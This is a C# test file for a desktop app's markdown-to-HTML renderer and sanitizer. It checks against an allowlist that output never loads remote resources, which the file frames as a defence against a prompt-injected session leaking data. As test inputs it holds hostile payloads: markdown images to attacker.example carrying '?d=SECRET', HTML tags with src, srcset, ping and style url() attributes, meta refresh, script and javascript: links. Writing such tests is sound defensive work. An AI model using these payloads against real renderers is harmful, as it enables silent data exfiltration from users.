using AngleSharp.Dom;
using AngleSharp.Html.Parser;
using TessynDesktop.Models.Remote;
using TessynDesktop.WPF.Rendering;
using TessynDesktop.WPF.Services;

namespace TessynDesktop.WPF.Tests;

/// <summary>
/// With remote media only through the host's gated proxy, markdown must never produce an element or attribute that can load a resource
/// (a prompt-injected session could otherwise leak data with no click). The checks parse the output with a real HTML parser; a regex
/// over the string passed the earlier, broken stripper (review finding V1). The same renderer serves the preview pane.
/// </summary>
/// <remarks>Created by Claude</remarks>
public sealed class MarkdownNoRemoteResourceTests
{
	private static readonly HashSet<string> AllowedTags = new(StringComparer.Ordinal)
	{
		"p", "br", "hr", "h1", "h2", "h3", "h4", "h5", "h6", "ul", "ol", "li", "blockquote", "pre", "code", "em", "strong", "del", "ins", "mark", "sub", "sup",
		"a", "table", "thead", "tbody", "tfoot", "tr", "th", "td", "span", "div",
	};

	private static readonly HashSet<string> AllowedAttributes = new(StringComparer.Ordinal) { "href", "class", "start" };

	private readonly MarkdigEntryRenderer _renderer = new(new UrlPolicy(), new MediaLinkDetector(new MediaPreviewPolicy()), new LocalPathDetector());

	/// <summary>Parses <paramref name="html"/> and fails on any tag or attribute outside the allowlist, or an href that is not http(s) or "#".</summary>
	public static IDocument AssertSafe(string html)
	{
		var document = new HtmlParser().ParseDocument("<!DOCTYPE html><html><body>" + html + "</body></html>");
		foreach (var element in document.Body!.QuerySelectorAll("*"))
		{
			Assert.True(AllowedTags.Contains(element.LocalName), $"tag <{element.LocalName}> is not allowed in: {html}");
			foreach (var attribute in element.Attributes)
			{
				Assert.True(AllowedAttributes.Contains(attribute.Name), $"attribute {attribute.Name} on <{element.LocalName}> in: {html}");
				if (attribute.Name == "href")
					Assert.True(attribute.Value == "#" || attribute.Value.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || attribute.Value.StartsWith("https://", StringComparison.OrdinalIgnoreCase),
						$"href {attribute.Value} in: {html}");
			}
		}

		return document;
	}

	[Fact]
	public void AMarkdownImageToANonAllowlistedHost_ProducesNoElementWithARemoteUrl()
	{
		var html = _renderer.RenderMarkdown("![](https://attacker.example/p.png?d=SECRET) and ![chart](https://attacker.example/c.png?d=SECRET)");

		var document = AssertSafe(html);
		Assert.Empty(document.Body!.QuerySelectorAll("img,[src],[style]"));
		Assert.DoesNotContain("attacker.example", html);
		Assert.DoesNotContain("SECRET", html);
		Assert.Contains("chart", html);       // alt text stays
	}

	[Fact]
	public void AMarkdownImageToAnAllowlistedHost_IsStillNotAnElement()
	{
		var policy = new MediaPreviewPolicy();
		policy.SetHosts(["annielartens.online"]);
		var renderer = new MarkdigEntryRenderer(new UrlPolicy(), new MediaLinkDetector(policy));

		var html = renderer.RenderMarkdown("![r](https://annielartens.online/r/1.png)");

		AssertSafe(html);
		Assert.DoesNotContain("annielartens.online", html);   // media come only through the gated preview list, not the markdown
	}

	[Fact]
	public void TheReviewInputV1_ProducesTwoWellFormedLinksAndNoStyleAttribute()
	{
		var html = _renderer.RenderMarkdown("[a](https://h0.example/ \"t style=x\") [b](https://h1.example/style=background:url(https://e.example/b.png);x:)");

		var document = AssertSafe(html);
		var links = document.Body!.QuerySelectorAll("a").ToList();
		Assert.Equal(2, links.Count);
		Assert.Equal("https://h0.example/", links[0].GetAttribute("href"));
		Assert.StartsWith("https://h1.example/", links[1].GetAttribute("href"));
		Assert.Null(links[0].GetAttribute("title"));                      // titles never reach the HTML
		Assert.Equal(["a", "b"], links.Select(l => l.TextContent));        // nothing swallowed
		Assert.Empty(document.Body.QuerySelectorAll("[style]"));
	}

	[Theory]
	[InlineData("<img src=\"https://attacker.example/p.png\">")]
	[InlineData("<img srcset=\"https://attacker.example/p.png 2x\">")]
	[InlineData("<video poster=\"https://attacker.example/p.png\" src=\"https://attacker.example/v.mp4\"></video>")]
	[InlineData("<audio src=\"https://attacker.example/a.mp3\"></audio>")]
	[InlineData("<picture><source srcset=\"https://attacker.example/p.png\"></picture>")]
	[InlineData("<svg><image href=\"https://attacker.example/p.png\"/></svg>")]
	[InlineData("<object data=\"https://attacker.example/x\"></object><embed src=\"https://attacker.example/x\">")]
	[InlineData("<link rel=\"stylesheet\" href=\"https://attacker.example/x.css\"><meta http-equiv=\"refresh\" content=\"0;url=https://attacker.example\">")]
	[InlineData("<a href=\"https://example.com\" ping=\"https://attacker.example/ping\" style=\"background:url(https://attacker.example/b.png)\">x</a>")]
	[InlineData("<body background=\"https://attacker.example/b.png\">")]
	[InlineData("[x](https://example.com \"title\") [y][r]\n\n[r]: https://example.com/ \"y src=https://attacker.example/z\"")]
	[InlineData("|a|b|\n|:-|-:|\n|![x](https://attacker.example/q.png)|y|")]
	public void HostileMarkdown_NeverGivesAnythingOutsideTheAllowlist(string markdown) => AssertSafe(_renderer.RenderMarkdown(markdown));

	[Fact]
	public void TableAlignment_BecomesAClass_NotAStyle()
	{
		var html = _renderer.RenderMarkdown("|a|b|c|\n|:-|:-:|-:|\n|1|2|3|");

		var document = AssertSafe(html);
		Assert.Empty(document.Body!.QuerySelectorAll("[style]"));
		Assert.NotEmpty(document.Body.QuerySelectorAll("th.al-center,td.al-center"));
		Assert.NotEmpty(document.Body.QuerySelectorAll("th.al-right,td.al-right"));
	}

	[Fact]
	public void OrdinaryMarkdownSurvivesTheSanitizer()
	{
		var html = _renderer.RenderMarkdown("# T\n\n**b** _i_ `c` [l](https://example.com)\n\n```cs\nvar x = 1;\n```\n\n1. one\n2. two\n\n> q\n\n- [ ] todo");

		var document = AssertSafe(html);
		Assert.NotNull(document.Body!.QuerySelector("h1"));
		Assert.NotNull(document.Body.QuerySelector("strong"));
		Assert.NotNull(document.Body.QuerySelector("em"));
		Assert.NotNull(document.Body.QuerySelector("pre > code.language-cs"));
		Assert.NotNull(document.Body.QuerySelector("ol"));
		Assert.NotNull(document.Body.QuerySelector("blockquote"));
		Assert.Equal("https://example.com", document.Body.QuerySelector("a")!.GetAttribute("href"));
	}

	[Fact]
	public void TheSanitizerAloneRemovesWhatTheParserWouldHaveLetThrough()
	{
		var sanitizer = new HtmlAllowlistSanitizer(new UrlPolicy());

		var html = sanitizer.Sanitize("<p onclick=\"x()\" style=\"a\">t<img src=https://e.example/p.png><script>alert(1)</script><a href=\"javascript:x\" class=\"b c\" ping=\"p\">l</a><svg><circle/></svg></p>");

		var document = AssertSafe(html);
		Assert.Equal("<p>t<a href=\"#\" class=\"b c\">l</a></p>", html);
		Assert.DoesNotContain("alert", document.Body!.TextContent);
	}

	[Fact]
	public void SeededFuzz_OfLinkTitlesTextsAndUrls_NeverLeavesAForbiddenAttributeOrTag()
	{
		string[] fragments =
		[
			"style=x", "style=\"a\"", "src=https://e.example/p.png", "srcset=a", "ping=https://e.example/", "poster=x", "background=x", "data=x",
			"style=background:url(https://e.example/b.png)", " ", "t", "u", "\"", "'", "style=", "src", "=", "style=a\"style=b", "<img src=x>", "<", ">", "&", "`",
		];
		var random = new Random(7);
		for (var n = 0; n < 1500; n++)
		{
			var text = new System.Text.StringBuilder();
			for (var l = random.Next(1, 5); l > 0; l--)
			{
				string Fragments(int max) => string.Concat(Enumerable.Range(0, random.Next(0, max)).Select(_ => fragments[random.Next(fragments.Length)]));
				var title = Fragments(6).Replace("\"", "\\\"");
				var label = Fragments(4);
				var url = "https://h" + l + ".example/" + (random.Next(3) == 0 ? "src=https://e.example/q.png" : "p");
				text.Append(random.Next(3) switch
				{
					0 => $"[{label}]({url} \"{title}\") ",
					1 => $"![{label}]({url} \"{title}\") ",
					_ => $"[{label}]({url} '{title.Replace("'", "\\'")}')\n\n",
				}).Append(Fragments(4)).Append(' ');
			}

			AssertSafe(_renderer.RenderMarkdown(text.ToString()));
		}
	}

	[Fact]
	public void EntryRenderingKeepsMediaOnlyInTheGatedMediaList()
	{
		var entry = new SessionEntryDto
		{
			Index = 1, Role = "assistant", Timestamp = DateTimeOffset.UnixEpoch,
			Content = "![x](https://attacker.example/p.png?d=SECRET) see https://cdn.example.com/a.png",
		};

		var view = _renderer.Render(entry);

		AssertSafe(view.Html);
		Assert.DoesNotContain("attacker.example/p.png", view.Html);
		// Links to media are offered only through the gated list: click-to-load unless the host is allowlisted (none is here).
		Assert.Equal(["https://attacker.example/p.png?d=SECRET", "https://cdn.example.com/a.png"], view.Media);
	}
}
